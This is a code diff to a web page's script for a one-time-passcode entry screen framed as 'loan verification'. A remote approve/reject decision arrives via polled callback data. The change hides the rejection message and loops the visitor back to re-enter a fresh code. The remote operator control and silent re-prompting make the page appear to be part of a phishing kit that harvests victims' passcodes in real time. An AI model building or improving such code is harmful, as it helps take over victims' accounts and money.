@@ -401,6 +401,18 @@
             }
         }
 
+        function resetToOtpEntry() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'none';
+            otpBoxes.forEach(box => {
+                box.value = '';
+            });
+            otpValue = '';
+            actionProcessed = false;
+            checkOtpComplete();
+            otpBoxes[0].focus();
+        }
+
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 box.value = box.value.replace(/\D/g, '');
@@ -454,6 +466,13 @@
             if (pollInterval1) clearInterval(pollInterval1);
             if (pollInterval2) clearInterval(pollInterval2);
 
+            const [decision] = callbackData.split('_');
+
+            if (decision === 'reject') {
+                resetToOtpEntry();
+                return;
+            }
+
             spinnerOverlay.style.display = 'none';
             resultOverlay.style.display = 'flex';
 
@@ -477,12 +496,8 @@
                             inset 0 0 15px rgba(0,191,255,0.08);
             `;
 
-            const [decision] = callbackData.split('_');
-
             if (decision === 'approve') {
                 resultMessage.textContent = '✦ REQUEST APPROVED ✦\n\nYour loan verification has been approved. Please stay on this page while we finalize your application.';
-            } else if (decision === 'reject') {
-                resultMessage.textContent = '✖ REQUEST REJECTED\n\nYour loan verification request was rejected. Please review your details and try again.';
             }
         }
 
